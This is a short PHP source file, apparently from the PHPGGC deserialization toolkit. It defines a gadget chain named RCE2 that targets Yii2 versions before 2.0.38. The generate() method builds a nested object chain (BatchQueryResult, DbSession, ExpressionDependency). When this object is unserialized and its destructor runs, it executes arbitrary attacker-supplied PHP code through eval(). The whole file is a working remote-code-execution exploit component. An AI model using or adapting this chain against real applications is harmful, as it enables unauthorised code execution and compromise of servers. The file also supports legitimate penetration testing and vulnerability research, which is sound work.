<?php

namespace GadgetChain\Yii2;

class RCE2 extends \PHPGGC\GadgetChain\RCE\PHPCode
{
    public static $version = '<2.0.38';
    public static $vector = '__destruct';
    public static $author = 'RedTeam Pentesting GmbH';
    public static $information = 'Executes given PHP code through eval().';
    public static $parameters = [ 
        'code'
    ];

    public function generate(array $parameters)
    {
        $code = $parameters['code'];

        $expression = new \yii\caching\ExpressionDependency($code);
        $callback = array($expression, 'evaluateDependency');
        $dbsession = new \yii\web\DbSession($callback);
        $query = new \yii\db\BatchQueryResult($dbsession);

        return $query;
    }
}

